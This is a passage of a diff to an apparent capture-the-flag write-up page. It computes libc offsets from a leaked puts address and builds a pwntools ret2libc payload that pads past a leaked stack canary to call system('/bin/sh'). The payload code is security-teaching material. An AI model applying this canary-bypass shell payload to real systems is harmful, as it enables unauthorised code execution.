+<span id="cb14-2"><a href="#cb14-2"></a>libc6-i386_2.27-3ubuntu1.2_amd64</span></code></pre></div>
 <p>Find <code>system</code> offset and <code>str_bin_sh</code> offset from <a href="https://libc.blukat.me/d/libc6-i386_2.27-3ubuntu1.2_amd64.symbols">libc6-i386_2.27-3ubuntu1.2_amd64</a>. Then the addresses could be calculated.</p>
-<pre><code>libc_base = puts_addr - 0x673d0
-sys_addr = libc_base + 0x3cd80
-binsh_addr = libc_base + 0x17bb8f</code></pre>
+<div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1"></a>libc_base <span class="op">=</span> puts_addr <span class="op">-</span> <span class="bn">0x673d0</span></span>
+<span id="cb15-2"><a href="#cb15-2"></a>sys_addr <span class="op">=</span> libc_base <span class="op">+</span> <span class="bn">0x3cd80</span></span>
+<span id="cb15-3"><a href="#cb15-3"></a>binsh_addr <span class="op">=</span> libc_base <span class="op">+</span> <span class="bn">0x17bb8f</span></span></code></pre></div>
 <h2 id="get-shell">Get shell</h2>
 <p>To get shell we need to call <code>system</code> with argument <code>/bin/sh</code>. Again as <code>win</code> has been called when we try to find address of <code>puts</code>, now we just send the payload when winner name is asked. The payload follow format</p>
 <p><code>padding(512bytes) + canary + padding(12bytes) + system address + win address + string bin sh address</code></p>
-<pre><code>payload = b&#39;A&#39; * 512 + pwn.p32(canary) + b&#39;B&#39;*12
-payload += pwn.p32(sys_addr)
-payload += pwn.p32(elf.sym[&#39;win&#39;])
-payload += pwn.p32(binsh_addr)</code></pre>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1"></a>payload <span class="op">=</span> b<span class="st">&#39;A&#39;</span> <span class="op">*</span> <span class="dv">512</span> <span class="op">+</span> pwn.p32(canary) <span class="op">+</span> b<span class="st">&#39;B&#39;</span><span class="op">*</span><span class="dv">12</span></span>
+<span id="cb16-2"><a href="#cb16-2"></a>payload <span class="op">+=</span> pwn.p32(sys_addr)</span>
+<span id="cb16-3"><a href="#cb16-3"></a>payload <span class="op">+=</span> pwn.p32(elf.sym[<span class="st">&#39;win&#39;</span>])</span>
+<span id="cb16-4"><a href="#cb16-4"></a>payload <span class="op">+=</span> pwn.p32(binsh_addr)</span></code></pre></div>
 <p>Finally, combine them all to get shell and get the flag.</p>
     </div>
     <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
